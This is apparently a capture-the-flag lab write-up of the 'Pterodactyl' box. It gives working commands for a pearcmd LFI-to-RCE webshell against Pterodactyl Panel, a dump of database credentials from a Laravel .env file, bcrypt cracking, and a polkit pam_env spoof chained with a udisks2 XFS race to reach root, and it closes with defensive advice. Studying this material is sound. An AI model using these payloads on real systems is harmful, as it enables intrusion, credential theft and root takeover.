---
title: "Pterodactyl"
machine: "Pterodactyl"
status: retired
os: Linux
difficulty: Medium
ownedUser: true
ownedRoot: true
date: 2026-05-21
techniques:
  - "LFI to RCE"
  - "PEAR pearcmd"
  - "Laravel .env read"
  - "bcrypt crack"
  - "PAM env spoof"
  - "udisks XFS TOCTOU"
cves:
  - "CVE-2025-49132"
  - "CVE-2025-6018"
  - "CVE-2025-6019"
summary: "Three real 2025 CVEs strung together — unauthenticated LFI/RCE in Pterodactyl Panel, PAM environment spoofing in polkit, and a TOCTOU race in udisks2's XFS resize. As close to a modern CVE-chain exercise as HTB has produced."
proof: "/proof/pterodactyl.png"
draft: false
---

## Summary

Pterodactyl is the closest HTB has come to a "chain three real 2025
CVEs" box. Unauthenticated code execution in Pterodactyl Panel via the
well-known `pearcmd.php` LFI technique; credentials from a Laravel
`.env`; a crackable bcrypt hash; and, once you SSH in, a two-CVE local
privilege escalation that abuses polkit session tracking and a TOCTOU
race in `udisks2`'s XFS resize handler.

## Reconnaissance

```bash
nmap -sC -sV -p- 10.129.X.X
```

Two services: SSH on 22 and nginx on 80. The web root redirects to
`pterodactyl.htb`, and vhost enumeration surfaces
`panel.pterodactyl.htb` running Pterodactyl Panel.

Fingerprint the version via a static asset hash or the
`/api/application/version` endpoint. A vulnerable build is affected by
**CVE-2025-49132**.

## Initial Access — LFI to RCE via `pearcmd`

The `/locales/locale.json` endpoint takes a user-supplied `locale`
parameter used to construct a file path. PHP is running with
`register_argc_argv=On`, which turns any query string into an `argv`
array for CLI-style PHP scripts included via path traversal. These two
facts together permit the well-known PEAR `pearcmd.php` RCE:

```bash
TARGET="http://panel.pterodactyl.htb"

# Write a webshell to /tmp/cmd.php via pearcmd config-create
curl -s "${TARGET}/locales/locale.json?\
+config-create+/&locale=../../../../../../usr/share/php/PEAR&\
namespace=pearcmd&/<?=system(\$_GET[cmd]);?>+/tmp/cmd.php"

# Trigger the webshell
curl -sG "${TARGET}/locales/locale.json?\
+config-create+/&locale=../../../../../../tmp/cmd&namespace=pearcmd&/x" \
  --data-urlencode "cmd=id"
# → uid=474(wwwrun) gid=474(www) groups=474(www)
```

Upgrade to an interactive shell.

> **Tip — why this technique keeps working.** Every PHP install ships
> PEAR. Every distribution used to enable `register_argc_argv=On`.
> Neither the app author nor the sysadmin thinks about the
> interaction. That's why `pearcmd` remains one of the highest ROI
> LFI escalations in 2025.

## Post-Exploitation — Laravel `.env` → MySQL → bcrypt

```bash
cat /var/www/pterodactyl/.env
# DB_HOST=127.0.0.1
# DB_DATABASE=panel
# DB_USERNAME=pterodactyl
# DB_PASSWORD=<panel-db-pass>
# APP_KEY=base64:...

mysql -upterodactyl -p'<panel-db-pass>' panel \
  -e "SELECT email,password FROM users;"
```

You get bcrypt hashes for every panel user. Crack the target user:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

A keyboard-walk password falls in seconds because `best64.rule` is
very good at mutating dictionary words into common patterns.

## User — SSH via Credential Reuse

The panel account credentials happen to also be OS credentials — a
credential-reuse debt this box uses to hand you the user proof.

```bash
ssh <panel-user>@10.129.X.X
```

## Privilege Escalation — Chained CVE-2025-6018 → CVE-2025-6019

Both are 2025 issues in the modern Linux userspace stack.

### CVE-2025-6018 — polkit PAM Environment Spoofing

`polkit` distinguishes between two privilege tiers: `allow_any` (any
authenticated session) and `allow_active` (the local seat / console).
`XDG_SEAT` and `XDG_VTNR` are the environment variables polkit checks.
On vulnerable systems, PAM's `pam_env` module reads
`~/.pam_environment` at login and injects those variables — meaning a
remote SSH session can forge itself into a "local console" from
polkit's point of view.

```bash
cat > ~/.pam_environment <<'EOF'
XDG_SEAT DEFAULT=seat0
XDG_VTNR DEFAULT=1
EOF

# Reconnect so pam_env re-reads the file
exit
ssh <panel-user>@10.129.X.X

# Verify polkit now grants allow_active
busctl call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/Manager \
  org.freedesktop.UDisks2.Manager CanFormat 'sa{sv}' xfs 0
# → (b true)   ← previously (b false)
```

### CVE-2025-6019 — udisks2 XFS Resize TOCTOU

With `allow_active` polkit rights, `udisks2` will run privileged XFS
operations. Its XFS resize handler mounts the block device to a
temporary path and then calls `xfs_growfs`. During that window the
loop-device backing file can be swapped via `/proc/<pid>/fd/` for a
crafted XFS image containing a SUID root binary. When `xfs_growfs`
runs, it operates on the swap-in image; the SUID binary planted inside
becomes accessible as root.

Key primitives:

```bash
# Prepare two XFS images: one clean, one with a SUID bash inode
dd if=/dev/zero of=/tmp/xfs1.image bs=1M count=50
/sbin/mkfs.xfs /tmp/xfs1.image

# Kick off udisks2 resize + race the backing-file swap through /proc
busctl call org.freedesktop.UDisks2 \
  /org/freedesktop/UDisks2/block_devices/loop0 \
  org.freedesktop.UDisks2.Filesystem Resize 'ta{sv}' <new_size> 0 &
# race window: swap loop0 backing file to the SUID-carrying image

# Execute the planted SUID bash from the momentarily mounted image
/tmp/mnt/bash -p
```

A root shell drops out.

## Attack Chain Summary

1. `nmap` → nginx + Pterodactyl Panel vhost
2. Version fingerprint → CVE-2025-49132 candidate
3. `pearcmd` LFI-to-RCE → webshell as `wwwrun`
4. `.env` → MySQL creds
5. MySQL → bcrypt for panel user
6. `hashcat -m 3200` + `best64` → cleartext
7. SSH as panel user → user proof
8. CVE-2025-6018 `pam_env` spoof → `allow_active`
9. CVE-2025-6019 udisks XFS TOCTOU → root shell

## Takeaways

- **LFI is not lower-severity than RCE.** With `pearcmd`, a single
  path-traversal often converts directly to code execution.
- **`.env` is a credential.** Any file-read primitive on a Laravel
  host ends with database access.
- **Modern Linux userspace has its own privilege boundaries.**
  `polkit` and `udisks2` are as important to reason about as
  `sudoers` once you land as a low-privileged user.

## Defensive Perspective

- **Patch Pterodactyl Panel** (CVE-2025-49132).
- **Set `register_argc_argv=Off`** in `php.ini` on every production
  host.
- **Move secrets out of `.env`.** Use a secrets manager or, at
  minimum, `chmod 600` owned by the service account.
- **Password policy + credential-reuse ban.** Panel credentials
  should never be OS credentials — that split is your last line of
  defense.
- **Patch polkit and udisks2** (CVE-2025-6018 and CVE-2025-6019).
  Remove `user_readenv=1` from `/etc/pam.d/` so PAM doesn't read
  user-writable env files.
- **Detection.** auditd on reads of `~/.pam_environment` after
  session establishment, and on `busctl call org.freedesktop.UDisks2
  ... Resize` from non-console sessions, is high signal.

## References

- [CVE-2025-49132 — Pterodactyl Panel LFI](https://www.cve.org/CVERecord?id=CVE-2025-49132)
- [CVE-2025-6018 — polkit PAM env spoof](https://www.cve.org/CVERecord?id=CVE-2025-6018)
- [CVE-2025-6019 — udisks2 XFS TOCTOU](https://www.cve.org/CVERecord?id=CVE-2025-6019)
- [MITRE ATT&CK T1068 — Exploitation for Privesc](https://attack.mitre.org/techniques/T1068/)
